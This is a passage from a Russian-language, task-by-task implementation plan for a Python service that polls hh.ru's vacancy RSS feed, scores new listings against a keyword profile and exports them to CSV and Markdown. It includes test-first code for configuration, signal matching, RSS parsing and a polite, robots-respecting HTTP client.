# HH.ru Autosearch Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Собрать сервис, который по расписанию ищет новые вакансии на hh.ru через публичную RSS-ленту, оценивает их по профилю и выгружает только новинки в CSV и Markdown.

**Architecture:** Семишаговый конвейер (discovery → dedup → prefilter → enrich → score → persist → emit). Дешёвые шаги отсева стоят до дорогого скачивания страниц. Состояние в SQLite, весь SQL изолирован в одном модуле-репозитории, вся работа с сетью — в одном HTTP-клиенте. Три протокола (`Scorer`, `Sink`, `Repository`) — точки расширения под LLM, Telegram и Postgres.

**Tech Stack:** Python 3.12, httpx, pydantic v2, PyYAML, typer, SQLite (stdlib), pytest + respx, ruff, mypy, uv, Docker.

**Спека:** `docs/superpowers/specs/2026-07-27-hh-autosearch-design.md`

## Global Constraints

- Python `>=3.12`. Все аннотации в современном стиле (`str | None`, `list[str]`).
- Рантайм-зависимости строго: `httpx`, `pydantic`, `pyyaml`, `typer`. Ничего больше добавлять нельзя.
- Сознательно **не** используем: `feedparser` (хватает `xml.etree`), HTML-парсер (JSON-LD достаётся регуляркой), `pandas` (хватает `csv`), `pymorphy` (хватает префикса основы).
- `pydantic-settings` появится только вместе с `TelegramSink` — в этом плане секретов нет, читать нечего.
- Все pydantic-модели конфига объявляются с `model_config = ConfigDict(extra="forbid")`. Опечатка в YAML обязана ронять процесс на старте.
- Вежливый HTTP — обязателен: честный `User-Agent` с контактом, `robots.txt` через `urllib.robotparser`, одно соединение за раз, пауза между запросами, соблюдение `429`/`Retry-After`. Устойчивый `403` останавливает прогон; **обходить блокировки запрещено**.
- Секретов в YAML нет. Только переменные окружения.
- Ориентир по размеру файла — ~150 строк. Исключение: `storage/repository.py` (~200), он намеренно собирает весь SQL в одном месте.
- Каждая задача заканчивается коммитом. Сообщения коммитов — на русском, в формате Conventional Commits.
- `mypy` запускается в строгом режиме и обязан проходить.

## Структура файлов

| Файл | Ответственность | Задача |
|---|---|---|
| `pyproject.toml` | Зависимости, ruff, mypy, pytest | 1 |
| `hh_search/config/models.py` | pydantic-схема трёх YAML | 1 |
| `hh_search/config/loader.py` | Чтение и валидация конфига | 1 |
| `hh_search/filtering/matching.py` | Нормализация текста, сопоставление сигналов | 2 |
| `hh_search/domain/models.py` | Доменные модели | 3 |
| `hh_search/sources/rss.py` | Сборка URL и разбор RSS | 3 |
| `hh_search/errors.py` | Типы исключений | 4 |
| `hh_search/sources/http.py` | Вежливый HTTP-клиент | 4 |
| `hh_search/sources/vacancy_page.py` | Извлечение JSON-LD | 5 |
| `hh_search/storage/schema.sql` | DDL | 6 |
| `hh_search/storage/repository.py` | Весь SQL | 6 |
| `hh_search/filtering/prefilter.py` | Дешёвый отсев по заголовку | 7 |
| `hh_search/scoring/base.py` | Протокол `Scorer` | 8 |
| `hh_search/scoring/keyword.py` | Keyword-скоринг | 8 |
| `hh_search/sinks/base.py` | Протокол `Sink` | 9 |
| `hh_search/sinks/csv_sink.py` | CSV-отчёт | 9 |
| `hh_search/sinks/markdown_sink.py` | Markdown-отчёт | 9 |
| `hh_search/pipeline.py` | Оркестрация семи шагов | 10 |
| `hh_search/logging_setup.py` | Логи в stdout + файл с ротацией | 11 |
| `hh_search/scheduler.py` | Цикл режима `serve` | 11 |
| `hh_search/__main__.py` | CLI | 11 |
| `Dockerfile`, `compose.yaml` | Развёртывание | 12 |
| `.github/workflows/ci.yml` | CI | 13 |

---

### Task 1: Каркас проекта и конфигурация

**Files:**
- Create: `pyproject.toml`, `.gitignore`, `.env.example`
- Create: `hh_search/__init__.py`, `hh_search/config/__init__.py`, `hh_search/config/models.py`, `hh_search/config/loader.py`
- Test: `tests/__init__.py`, `tests/test_config.py`

**Interfaces:**
- Consumes: ничего
- Produces: `load_config(config_dir: Path) -> Config`; модели `Config` (поля `app`, `profile`, `queries`), `AppConfig` (`contact_email: str`, `user_agent: str`, `schedule: ScheduleConfig`, `http: HttpConfig`, `enrich: EnrichConfig`, `sinks: list[str]`, `paths: PathsConfig`), `ProfileConfig` (`weights: Weights`, `saturation: Saturation`, `penalty_per_signal: float`, `signals: Signals`, `negative: list[str]`, `report_threshold: float`), `QueriesConfig` (`defaults: QueryDefaults`, `queries: list[QuerySpec]`), `QuerySpec` (`text`, `cluster`, `weight`, `area: list[int] | None`, `experience: list[str] | None`, `employment: str | None`, `schedule: str | None`, `period: int | None`), `Weights` (`title`, `stack`, `responsibilities`, `domain`), `Saturation` (`stack: int`, `responsibilities: int`), `Signals` (`title_roles`, `title_tech`, `stack`, `responsibilities`, `domain` — все `list[str]`), `HttpConfig` (`delay_between_requests_sec`, `timeout_sec`, `max_retries`, `respect_robots`), `EnrichConfig` (`max_attempts: int`), `ScheduleConfig` (`interval_hours: int`), `PathsConfig` (`state: Path`, `reports: Path`, `logs: Path`)

- [ ] **Step 1: Создать `pyproject.toml`**

```toml
[project]
name = "hh-search"
version = "0.1.0"
requires-python = ">=3.12"
dependencies = [
    "httpx>=0.27",
    "pydantic>=2.7",
    "pyyaml>=6.0",
    "typer>=0.12",
]

[project.optional-dependencies]
dev = ["pytest>=8.0", "respx>=0.21", "ruff>=0.5", "mypy>=1.10", "types-PyYAML"]

[build-system]
requires = ["hatchling"]
build-backend = "hatchling.build"

[tool.hatch.build.targets.wheel]
packages = ["hh_search"]

[tool.pytest.ini_options]
markers = ["network: ходит в живой hh.ru; в CI пропускается"]
addopts = "-m 'not network'"
testpaths = ["tests"]

[tool.ruff]
line-length = 100
target-version = "py312"

[tool.ruff.lint]
# BLE и SLF включены намеренно: широкий except и доступ к приватным атрибутам
# в этом проекте допустимы только там, где это осознанно помечено noqa.
select = ["E", "F", "I", "UP", "B", "BLE", "SLF"]

[tool.mypy]
python_version = "3.12"
strict = true
plugins = ["pydantic.mypy"]
```

- [ ] **Step 2: Создать `.gitignore` и `.env.example`**

`.gitignore`:
```
__pycache__/
*.py[cod]
.venv/
.pytest_cache/
.mypy_cache/
.ruff_cache/
dist/
data/
.env
```

`.env.example`:
```
# Понадобится начиная с TelegramSink, в первой версии не используется.
# HH_TELEGRAM_TOKEN=
# HH_TELEGRAM_CHAT_ID=
```

- [ ] **Step 3: Написать падающий тест конфигурации**

Создать `tests/test_config.py`:

```python
from pathlib import Path

import pytest
from pydantic import ValidationError

from hh_search.config.loader import load_config

APP_YAML = """
contact_email: "me@example.com"
user_agent: "hh-search/0.1 (personal job search; {contact_email})"
schedule:
  interval_hours: 4
http:
  delay_between_requests_sec: 1.0
  timeout_sec: 20
  max_retries: 3
  respect_robots: true
enrich:
  max_attempts: 3
sinks: [csv, markdown]
paths:
  state: /data/state/hh.db
  reports: /data/reports
  logs: /data/logs
"""

PROFILE_YAML = """
weights: {title: 0.40, stack: 0.30, responsibilities: 0.20, domain: 0.10}
saturation: {stack: 5, responsibilities: 3}
penalty_per_signal: 15
signals:
  title_roles: [team lead]
  title_tech: [backend]
  stack: [yocto]
  responsibilities: [архитектур]
  domain: [телеком]
negative: [junior]
report_threshold: 60
"""

QUERIES_YAML = """
defaults:
  experience: [between3And6, moreThan6]
  employment: full
queries:
  - text: "Yocto"
    cluster: embedded
    weight: 9
    area: [66]
"""


def write_config(tmp_path: Path, **overrides: str) -> Path:
    files = {"app.yaml": APP_YAML, "profile.yaml": PROFILE_YAML, "queries.yaml": QUERIES_YAML}
    files.update(overrides)
    for name, body in files.items():
        (tmp_path / name).write_text(body, encoding="utf-8")
    return tmp_path


def test_loads_all_three_files(tmp_path: Path) -> None:
    cfg = load_config(write_config(tmp_path))
    assert cfg.app.schedule.interval_hours == 4
    assert cfg.profile.weights.stack == 0.30
    assert cfg.queries.queries[0].text == "Yocto"
    assert cfg.queries.queries[0].area == [66]


def test_user_agent_gets_contact_email_substituted(tmp_path: Path) -> None:
    cfg = load_config(write_config(tmp_path))
    assert cfg.app.user_agent == "hh-search/0.1 (personal job search; me@example.com)"


def test_unknown_key_is_rejected(tmp_path: Path) -> None:
    broken = PROFILE_YAML + "\nreport_treshold: 70\n"  # опечатка в слове threshold
    with pytest.raises(ValidationError):
        load_config(write_config(tmp_path, **{"profile.yaml": broken}))


def test_weights_must_sum_to_one(tmp_path: Path) -> None:
    broken = PROFILE_YAML.replace("title: 0.40", "title: 0.90")
    with pytest.raises(ValidationError, match="sum to 1.0"):
        load_config(write_config(tmp_path, **{"profile.yaml": broken}))


def test_query_inherits_defaults(tmp_path: Path) -> None:
    cfg = load_config(write_config(tmp_path))
    query = cfg.queries.queries[0]
    assert query.experience == ["between3And6", "moreThan6"]
    assert query.employment == "full"
```

- [ ] **Step 4: Запустить тест и убедиться, что он падает**

Run: `uv run pytest tests/test_config.py -v`
Expected: FAIL с `ModuleNotFoundError: No module named 'hh_search'`

- [ ] **Step 5: Реализовать `hh_search/config/models.py`**

```python
from pathlib import Path

from pydantic import BaseModel, ConfigDict, model_validator


class Base(BaseModel):
    model_config = ConfigDict(extra="forbid")


class ScheduleConfig(Base):
    interval_hours: int = 4


class HttpConfig(Base):
    delay_between_requests_sec: float = 1.0
    timeout_sec: float = 20.0
    max_retries: int = 3
    respect_robots: bool = True


class EnrichConfig(Base):
    max_attempts: int = 3


class PathsConfig(Base):
    state: Path
    reports: Path
    logs: Path


class AppConfig(Base):
    contact_email: str
    user_agent: str
    schedule: ScheduleConfig = ScheduleConfig()
    http: HttpConfig = HttpConfig()
    enrich: EnrichConfig = EnrichConfig()
    sinks: list[str]
    paths: PathsConfig

    @model_validator(mode="after")
    def substitute_contact_email(self) -> "AppConfig":
        self.user_agent = self.user_agent.format(contact_email=self.contact_email)
        return self


class Weights(Base):
    title: float
    stack: float
    responsibilities: float
    domain: float

    @model_validator(mode="after")
    def check_sum(self) -> "Weights":
        total = self.title + self.stack + self.responsibilities + self.domain
        if abs(total - 1.0) > 1e-6:
            raise ValueError(f"weights must sum to 1.0, got {total}")
        return self


class Saturation(Base):
    stack: int
    responsibilities: int


class Signals(Base):
    title_roles: list[str]
    title_tech: list[str]
    stack: list[str]
    responsibilities: list[str]
    domain: list[str]


class ProfileConfig(Base):
    weights: Weights
    saturation: Saturation
    penalty_per_signal: float
    signals: Signals
    negative: list[str]
    report_threshold: float = 60.0


class QueryDefaults(Base):
    experience: list[str] | None = None
    employment: str | None = None
    schedule: str | None = None
    period: int | None = None


class QuerySpec(Base):
    text: str
    cluster: str
    weight: int = 5
    area: list[int] | None = None
    experience: list[str] | None = None
    employment: str | None = None
    schedule: str | None = None
    period: int | None = None


class QueriesConfig(Base):
    defaults: QueryDefaults = QueryDefaults()
    queries: list[QuerySpec]

    @model_validator(mode="after")
    def apply_defaults(self) -> "QueriesConfig":
        for query in self.queries:
            for field in ("experience", "employment", "schedule", "period"):
                if getattr(query, field) is None:
                    setattr(query, field, getattr(self.defaults, field))
        return self


class Config(Base):
    app: AppConfig
    profile: ProfileConfig
    queries: QueriesConfig
```

- [ ] **Step 6: Реализовать `hh_search/config/loader.py`**

```python
from pathlib import Path
from typing import Any

import yaml

from hh_search.config.models import Config


def _read_yaml(path: Path) -> dict[str, Any]:
    if not path.exists():
        raise FileNotFoundError(f"конфиг не найден: {path}")
    with path.open(encoding="utf-8") as handle:
        data = yaml.safe_load(handle)
    if not isinstance(data, dict):
        raise ValueError(f"ожидался словарь в {path}, получено {type(data).__name__}")
    return data


def load_config(config_dir: Path) -> Config:
    """Читает три YAML из каталога и валидирует их. Бросает на первой же ошибке."""
    return Config.model_validate(
        {
            "app": _read_yaml(config_dir / "app.yaml"),
            "profile": _read_yaml(config_dir / "profile.yaml"),
            "queries": _read_yaml(config_dir / "queries.yaml"),
        }
    )
```

Создать пустые `hh_search/__init__.py`, `hh_search/config/__init__.py`, `tests/__init__.py`.

- [ ] **Step 7: Запустить тесты и убедиться, что они проходят**

Run: `uv run pytest tests/test_config.py -v && uv run mypy hh_search && uv run ruff check .`
Expected: 5 passed, mypy и ruff без замечаний

- [ ] **Step 8: Коммит**

```bash
git add pyproject.toml .gitignore .env.example hh_search tests
git commit -m "feat: каркас проекта и загрузка конфигурации

Три YAML-файла (app/profile/queries) с валидацией через pydantic.
extra=forbid, чтобы опечатка роняла процесс на старте, а не молча
меняла поведение. Веса скоринга проверяются на сумму 1.0."
```

---

### Task 2: Нормализация и сопоставление сигналов

Это модуль, где закопаны главные грабли (спека §6.1). Он чистый, без ввода-вывода, и тестируется плотнее всего остального.

**Files:**
- Create: `hh_search/filtering/__init__.py`, `hh_search/filtering/matching.py`
- Test: `tests/test_matching.py`

**Interfaces:**
- Consumes: ничего
- Produces: `normalize(text: str) -> str`; `class SignalMatcher` с конструктором `SignalMatcher(patterns: Sequence[str])`, методами `find(text: str) -> list[str]` (возвращает **исходные** строки паттернов в порядке их объявления) и `has_any(text: str) -> bool`

**Правило сопоставления** (задаётся один раз здесь и дальше нигде не переизобретается),
решение принимается **для каждого слова отдельно** и по исходному написанию, до нормализации:

- слово содержит кириллицу **и не содержит цифр** → матчится **по началу слова**
  (`архитектур` ловит `архитектуры`). Цифры исключены, иначе код `1С` превратился бы
  в неограниченный префикс и ловил `1Cats`;
- иначе → матчится **как целое слово** (`lead` не ловится в `leadership`).

Границы слова заданы lookaround'ами, а не `\b`: обычная граница ломается на `C++` и `C#`.
Правая граница `(?![\w+#]|\.\w)` допускает точку, если за ней не идёт буква — иначе
терялось бы любое ключевое слово в конце предложения.

**Следствие для конфига:** кириллические сигналы в `profile.yaml` пишутся **основами**
(`архитектур`, `проектирован`), а не полными словоформами. Литеральный префикс не поймает
`информационной`, если задать `информационная` — расхождение приходится на конец паттерна,
и хвост `\w*` его не компенсирует.

- [ ] **Step 1: Написать падающий тест**

Создать `tests/test_matching.py`:

```python
from hh_search.filtering.matching import SignalMatcher, normalize


def test_normalize_unifies_cyrillic_and_latin_lookalikes() -> None:
    assert normalize("1С") == normalize("1C")  # первая С кириллическая


def test_normalize_collapses_yo_and_case() -> None:
    assert normalize("Стажёр") == normalize("стажер")


def test_latin_pattern_matches_whole_word_only() -> None:
    matcher = SignalMatcher(["lead"])
    assert matcher.find("Ищем Team Lead в команду") == ["lead"]
    assert matcher.find("Strong leadership skills") == []


def test_cyrillic_pattern_matches_by_stem() -> None:
    matcher = SignalMatcher(["архитектур"])
    assert matcher.find("Проектирование архитектуры сервисов") == ["архитектур"]


def test_cyrillic_stem_must_start_a_word() -> None:
    matcher = SignalMatcher(["строй"])
    assert matcher.find("настройка сервера") == []


def test_plus_signs_do_not_break_boundaries() -> None:
    matcher = SignalMatcher(["c++"])
    assert matcher.find("Требуется опыт C++ и Python") == ["c++"]


def test_bare_c_does_not_match_cpp() -> None:
    matcher = SignalMatcher(["c#"])
    assert matcher.find("Требуется опыт C++") == []


def test_stop_word_matches_cyrillic_spelling_of_1c() -> None:
    matcher = SignalMatcher(["1c"])
    assert matcher.find("Разработчик 1С") == ["1c"]


def test_multiword_pattern_tolerates_extra_whitespace() -> None:
    matcher = SignalMatcher(["team lead"])
    assert matcher.find("Ищем Team  Lead") == ["team lead"]


def test_find_returns_original_spelling_without_duplicates() -> None:
    matcher = SignalMatcher(["Yocto", "BSP"])
    assert matcher.find("Yocto, BSP и снова yocto") == ["Yocto", "BSP"]


def test_has_any_is_true_when_something_matched() -> None:
    matcher = SignalMatcher(["junior"])
    assert matcher.has_any("Junior developer") is True
    assert matcher.has_any("Senior developer") is False
```

- [ ] **Step 2: Запустить тест и убедиться, что он падает**

Run: `uv run pytest tests/test_matching.py -v`
Expected: FAIL с `ModuleNotFoundError: No module named 'hh_search.filtering'`

- [ ] **Step 3: Реализовать `hh_search/filtering/matching.py`**

```python
import re
from collections.abc import Sequence

# Кириллические буквы, неотличимые на вид от латинских. Отображение применяется
# и к тексту, и к паттернам, поэтому русские слова продолжают совпадать друг с
# другом, а «1С» и «1C» сходятся в одну форму.
_CONFUSABLES = {
    "ё": "e", "е": "e", "а": "a", "в": "b", "с": "c", "к": "k",
    "м": "m", "н": "h", "о": "o", "р": "p", "т": "t", "у": "y", "х": "x",
}
_TRANSLATION = str.maketrans(_CONFUSABLES)

_CYRILLIC = re.compile(r"[а-яё]", re.IGNORECASE)

# Границы слова, устойчивые к «+», «#» и «.» — обычный \b на них не работает,
# потому что после «+» нет перехода между словесным и несловесным символом.
# Точка справа разрешена, если за ней не идёт буква: иначе терялось бы любое
# ключевое слово в конце предложения, а «node» всё ещё не ловится в «node.js».
_LEFT_BOUNDARY = r"(?<![\w+#.])"
_RIGHT_BOUNDARY = r"(?![\w+#]|\.\w)"


def normalize(text: str) -> str:
    """Нижний регистр плюс схлопывание визуально одинаковых символов."""
    return text.lower().translate(_TRANSLATION)


def _is_stem_word(word: str) -> bool:
    """Кириллическое слово без цифр склоняется, поэтому матчится по основе.

    Решение принимается по исходному написанию слова, до нормализации.
    Цифры исключены из правила, чтобы короткие коды вроде «1С» не превращались
    в неограниченный префиксный матч (1С не должно ловить 1Cats).
    """
    return bool(_CYRILLIC.search(word)) and not any(ch.isdigit() for ch in word)


def _compile(pattern: str) -> re.Pattern[str]:
    raw_words = pattern.split()
    norm_words = normalize(pattern).split()
    parts = [
        re.escape(norm_word) + (r"\w*" if _is_stem_word(raw_word) else "")
        for raw_word, norm_word in zip(raw_words, norm_words, strict=True)
    ]
    body = r"\s+".join(parts)
    # Хвост из \w* у последнего слова уже сам ограничивает совпадение справа;
    # добавлять _RIGHT_BOUNDARY нужно, только если последнее слово не по основе.
    tail = "" if raw_words and _is_stem_word(raw_words[-1]) else _RIGHT_BOUNDARY
    return re.compile(_LEFT_BOUNDARY + body + tail)


class SignalMatcher:
    """Ищет в тексте вхождения списка сигналов, возвращая исходные написания."""

    def __init__(self, patterns: Sequence[str]) -> None:
        self._patterns = list(patterns)
        self._compiled = [_compile(pattern) for pattern in self._patterns]

    def find(self, text: str) -> list[str]:
        haystack = normalize(text)
        return [
            original
            for original, regex in zip(self._patterns, self._compiled, strict=True)
            if regex.search(haystack)
        ]

    def has_any(self, text: str) -> bool:
        haystack = normalize(text)
        return any(regex.search(haystack) for regex in self._compiled)
```

Создать пустой `hh_search/filtering/__init__.py`.

- [ ] **Step 4: Запустить тесты и убедиться, что они проходят**

Run: `uv run pytest tests/test_matching.py -v && uv run mypy hh_search`
Expected: 15 passed (11 из брифа плюс 4 регрессионных на границы, пер-словный стемминг и правило цифра+кириллица)

- [ ] **Step 5: Коммит**

```bash
git add hh_search/filtering tests/test_matching.py
git commit -m "feat: нормализация текста и сопоставление сигналов

Схлопывание визуально одинаковых кириллических и латинских букв —
без него стоп-слово 1C молча не ловит написание 1С. Кириллические
паттерны матчатся по основе слова, латинские — как целое слово,
поэтому lead не срабатывает внутри leadership. Границы слова
сделаны на lookaround, обычный \\b ломается на C++ и C#."
```

> **Известные ограничения, вынести в README на Task 13:**
> 1. Короткие латинские паттерны из «похожих» букв дают ложные срабатывания на русских
>    словах: `c` совпадает с предлогом «с», `co` — с «со». Пишите `c++`, `c/c++` или `си`.
> 2. Кириллические сигналы задаются **основами** (`архитектур`), не словоформами.
> 3. Многословные паттерны терпят лишние пробелы, но не дефис: `team lead` не поймает
>    `Team-Lead`.

---

### Task 3: Доменные модели и разбор RSS

**Files:**
- Create: `hh_search/domain/__init__.py`, `hh_search/domain/models.py`, `hh_search/sources/__init__.py`, `hh_search/sources/rss.py`
- Create: `tests/fixtures/rss_yocto.xml`
- Test: `tests/test_rss.py`

**Interfaces:**
- Consumes: `QuerySpec` из Task 1
- Produces: модели `Salary` (`raw: str | None`, `amount_from: int | None`, `amount_to: int | None`, `currency: str | None`), `DiscoveredVacancy` (`id: str`, `url: str`, `title: str`, `company: str | None`, `area: str | None`, `salary: Salary`, `published_at: datetime`, `found_by_query: str`), `VacancyDetails` (`description: str`, `valid_through: datetime | None`, `location: str | None`), `ScoreBreakdown` (`title: float`, `stack: float`, `responsibilities: float`, `domain: float`, `penalty: float`, `total: float`, `matched: dict[str, list[str]]`), `ScoredVacancy` (`discovered: DiscoveredVacancy`, `details: VacancyDetails`, `score: ScoreBreakdown`, `cluster: str`); функции `build_rss_url(query: QuerySpec) -> str`, `parse_salary(raw: str) -> Salary`, `parse_feed(xml_text: str, query_text: str) -> list[DiscoveredVacancy]`

- [ ] **Step 1: Сохранить фикстуру живой RSS-ленты**

Эти URL проверены 2026-07-27 и на тот момент отдавали 200.

```bash
mkdir -p tests/fixtures
curl -s -H "User-Agent: hh-search/0.1 (fixture capture)" \
  "https://hh.ru/search/vacancy/rss?text=Yocto&order_by=publication_time" \
  -o tests/fixtures/rss_yocto.xml
grep -c '<item>' tests/fixtures/rss_yocto.xml   # ожидается 20
```

Если hh недоступен — соберите фикстуру вручную по образцу структуры:
`<rss version="2.0"><channel>` с элементами `<item>`, каждый содержит `<pubDate>`,
`<title>`, `<link>https://hh.ru/vacancy/135586311</link>`, `<guid>` и `<description>`
с CDATA вида
`<p>Вакансия компании: НАЗВАНИЕ</p> <p>Создана: 27.07.2026</p> <p>Регион: Москва</p> <p>Предполагаемый уровень месячного дохода: не указан</p>`.

- [ ] **Step 2: Написать падающий тест**

Создать `tests/test_rss.py`:

```python
from datetime import datetime
from pathlib import Path

import pytest

from hh_search.config.models import QuerySpec
from hh_search.sources.rss import build_rss_url, parse_feed, parse_salary

FIXTURE = Path(__file__).parent / "fixtures" / "rss_yocto.xml"


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("не указан", (None, None, None)),
        ("от 200 000 руб.", (200000, None, "руб.")),
        ("от 100 000 до 150 000 руб.", (100000, 150000, "руб.")),
        ("до 300 000 руб.", (None, 300000, "руб.")),
    ],
)
def test_parse_salary(raw: str, expected: tuple[int | None, int | None, str | None]) -> None:
    salary = parse_salary(raw)
    assert (salary.amount_from, salary.amount_to, salary.currency) == expected


def test_parse_salary_handles_non_breaking_spaces() -> None:
    assert parse_salary("от 200 000 руб.").amount_from == 200000


def test_parse_feed_extracts_every_item() -> None:
    vacancies = parse_feed(FIXTURE.read_text(encoding="utf-8"), "Yocto")
    assert len(vacancies) == 20
    assert all(vacancy.id.isdigit() for vacancy in vacancies)
    assert all(vacancy.found_by_query == "Yocto" for vacancy in vacancies)


def test_parse_feed_extracts_fields_of_first_item() -> None:
    first = parse_feed(FIXTURE.read_text(encoding="utf-8"), "Yocto")[0]
    assert first.url == f"https://hh.ru/vacancy/{first.id}"
    assert first.title
    assert first.company
    assert first.area
    assert isinstance(first.published_at, datetime)


def test_build_rss_url_includes_filters_and_date_ordering() -> None:
    url = build_rss_url(
        QuerySpec(
            text="Backend Team Lead",
            cluster="backend",
            area=[66],
            experience=["between3And6", "moreThan6"],
            employment="full",
        )
    )
    assert url.startswith("https://hh.ru/search/vacancy/rss?")
    assert "text=Backend+Team+Lead" in url
    assert "area=66" in url
    assert "experience=between3And6" in url
    assert "experience=moreThan6" in url
    assert "employment=full" in url
    assert "order_by=publication_time" in url


def test_build_rss_url_omits_unset_filters() -> None:
    url = build_rss_url(QuerySpec(text="Yocto", cluster="embedded"))
    assert "area=" not in url
    assert "schedule=" not in url
```

- [ ] **Step 3: Запустить тест и убедиться, что он падает**

Run: `uv run pytest tests/test_rss.py -v`
Expected: FAIL с `ModuleNotFoundError: No module named 'hh_search.domain'`

- [ ] **Step 4: Реализовать `hh_search/domain/models.py`**

```python
from datetime import datetime

from pydantic import BaseModel


class Salary(BaseModel):
    raw: str | None = None
    amount_from: int | None = None
    amount_to: int | None = None
    currency: str | None = None


class DiscoveredVacancy(BaseModel):
    id: str
    url: str
    title: str
    company: str | None = None
    area: str | None = None
    salary: Salary = Salary()
    published_at: datetime
    found_by_query: str


class VacancyDetails(BaseModel):
    description: str
    valid_through: datetime | None = None
    location: str | None = None


class ScoreBreakdown(BaseModel):
    title: float
    stack: float
    responsibilities: float
    domain: float
    penalty: float
    total: float
    matched: dict[str, list[str]] = {}


class ScoredVacancy(BaseModel):
    discovered: DiscoveredVacancy
    details: VacancyDetails
    score: ScoreBreakdown
    cluster: str
```

- [ ] **Step 5: Реализовать `hh_search/sources/rss.py`**

```python
import re
from datetime import datetime
from urllib.parse import urlencode
from xml.etree import ElementTree

from hh_search.config.models import QuerySpec
from hh_search.domain.models import DiscoveredVacancy, Salary

RSS_BASE_URL = "https://hh.ru/search/vacancy/rss"

_ID_RE = re.compile(r"/vacancy/(\d+)")
_COMPANY_RE = re.compile(r"Вакансия компании:\s*([^<]+)")
_REGION_RE = re.compile(r"Регион:\s*([^<]+)")
_INCOME_RE = re.compile(r"дохода:\s*([^<]+)")
_FROM_RE = re.compile(r"от\s*([\d\s ]+)")
_TO_RE = re.compile(r"до\s*([\d\s ]+)")
_CURRENCY_RE = re.compile(r"([A-Za-zА-Яа-я.]+)\s*$")
_DIGITS_ONLY = re.compile(r"[\s ]")


def build_rss_url(query: QuerySpec) -> str:
    params: list[tuple[str, str]] = [("text", query.text), ("order_by", "publication_time")]
    for area in query.area or []:
        params.append(("area", str(area)))
    for experience in query.experience or []:
        params.append(("experience", experience))
    if query.employment:
        params.append(("employment", query.employment))
    if query.schedule:
        params.append(("schedule", query.schedule))
    if query.period is not None:
        params.append(("period", str(query.period)))
    return f"{RSS_BASE_URL}?{urlencode(params)}"


def parse_salary(raw: str) -> Salary:
    text = (raw or "").strip()
    if not text or "не указан" in text:
        return Salary(raw=text or None)

    def to_int(match: re.Match[str] | None) -> int | None:
        if match is None:
            return None
        digits = _DIGITS_ONLY.sub("", match.group(1))
        return int(digits) if digits.isdigit() else None

    currency_match = _CURRENCY_RE.search(text)
    return Salary(
        raw=text,
        amount_from=to_int(_FROM_RE.search(text)),
        amount_to=to_int(_TO_RE.search(text)),
        currency=currency_match.group(1) if currency_match else None,
    )


def _first_group(regex: re.Pattern[str], text: str) -> str | None:
    match = regex.search(text)
    return match.group(1).strip() if match else None


def parse_feed(xml_text: str, query_text: str) -> list[DiscoveredVacancy]:
    root = ElementTree.fromstring(xml_text)
    vacancies: list[DiscoveredVacancy] = []
    for item in root.iterfind("./channel/item"):
        link = (item.findtext("link") or "").strip()
        id_match = _ID_RE.search(link)
        if not id_match:
            continue
        description = item.findtext("description") or ""
        income = _first_group(_INCOME_RE, description) or ""
        vacancies.append(
            DiscoveredVacancy(
                id=id_match.group(1),
                url=f"https://hh.ru/vacancy/{id_match.group(1)}",
                title=(item.findtext("title") or "").strip(),
                company=_first_group(_COMPANY_RE, description),
                area=_first_group(_REGION_RE, description),
                salary=parse_salary(income),
                published_at=datetime.fromisoformat((item.findtext("pubDate") or "").strip()),
                found_by_query=query_text,
            )
        )
    return vacancies
```

Создать пустые `hh_search/domain/__init__.py`, `hh_search/sources/__init__.py`.

>**Итоговая реализация отличается от кода выше.** Разбор зарплаты пережил пять
> раундов исправлений: `parse_salary` переписан на ОДНО якорное совпадение от
> начала строки (`от A [до B] ВАЛЮТА`), а `_FROM_RE`/`_TO_RE`/`_CURRENCY_RE`
> удалены. Причина: любой поиск кусков по всей строке подхватывал служебные
> слова («до вычета налогов», «опыт от 3 лет») вместо валюты. Актуальная версия —
> в `hh_search/sources/rss.py`, обоснование каждого раунда — в отчёте задачи.
> Тестов в файле по итогу 54, а не 9.

- [ ] **Step 6: Запустить тесты и убедиться, что они проходят**

Run: `uv run pytest tests/test_rss.py -v && uv run mypy hh_search`
Expected: 9 passed на исходном коде брифа

- [ ] **Step 7: Коммит**

```bash
git add hh_search/domain hh_search/sources tests/test_rss.py tests/fixtures
git commit -m "feat: доменные модели и разбор RSS-ленты hh.ru

Сборка URL со всеми фильтрами и обязательным order_by=publication_time
(без него окно из 20 вакансий перестаёт быть окном свежих). Разбор
ленты на xml.etree, зарплата вытаскивается из CDATA-описания с учётом
неразрывных пробелов. Тесты идут на зафиксированной живой ленте."
```

---

### Task 4: Вежливый HTTP-клиент

**Files:**
- Create: `hh_search/errors.py`, `hh_search/sources/http.py`
- Test: `tests/test_http.py`

**Interfaces:**
- Consumes: `HttpConfig` из Task 1
- Produces: исключения `AccessForbidden`, `FetchFailed`, `RobotsDisallowed` (все от `HhSearchError`); `class PoliteClient(config: HttpConfig, user_agent: str, sleep: Callable[[float], None] = time.sleep, transport: httpx.BaseTransport | None = None)` с методами `get(url: str, conditional: dict[str, str] | None = None) -> httpx.Response` и `close() -> None`; поддержка контекстного менеджера

Поведение `get`:
- перед запросом спит столько, чтобы с прошлого запроса прошло не менее `delay_between_requests_sec`;
- при `respect_robots` один раз тянет `https://hh.ru/robots.txt` и отклоняет запрещённые пути через `RobotsDisallowed`;
- `403` → `AccessForbidden` немедленно, без повторов;
- `429` → ждёт `Retry-After` (если заголовка нет — экспоненциальная пауза), до `max_retries` попыток;
- `5xx` и таймауты → экспоненциальный backoff, до `max_retries` попыток, затем `FetchFailed`;
- `304` возвращается вызывающему как есть.

- [ ] **Step 1: Написать падающий тест**

Создать `tests/test_http.py`:

```python
import httpx
import pytest
import respx

from hh_search.config.models import HttpConfig
from hh_search.errors import AccessForbidden, FetchFailed, RobotsDisallowed
from hh_search.sources.http import PoliteClient

URL = "https://hh.ru/search/vacancy/rss?text=Yocto"
ROBOTS = "https://hh.ru/robots.txt"


def make_client(**overrides: object) -> tuple[PoliteClient, list[float]]:
    slept: list[float] = []
    config = HttpConfig(
        delay_between_requests_sec=1.0, timeout_sec=5, max_retries=3, respect_robots=False
    )
    config = config.model_copy(update=overrides)
    return PoliteClient(config, "hh-search/test", sleep=slept.append), slept


@respx.mock
def test_sends_configured_user_agent() -> None:
    route = respx.get(URL).mock(return_value=httpx.Response(200, text="ok"))
    client, _ = make_client()
    with client:
        client.get(URL)
    assert route.calls.last.request.headers["User-Agent"] == "hh-search/test"


@respx.mock
def test_throttles_between_requests() -> None:
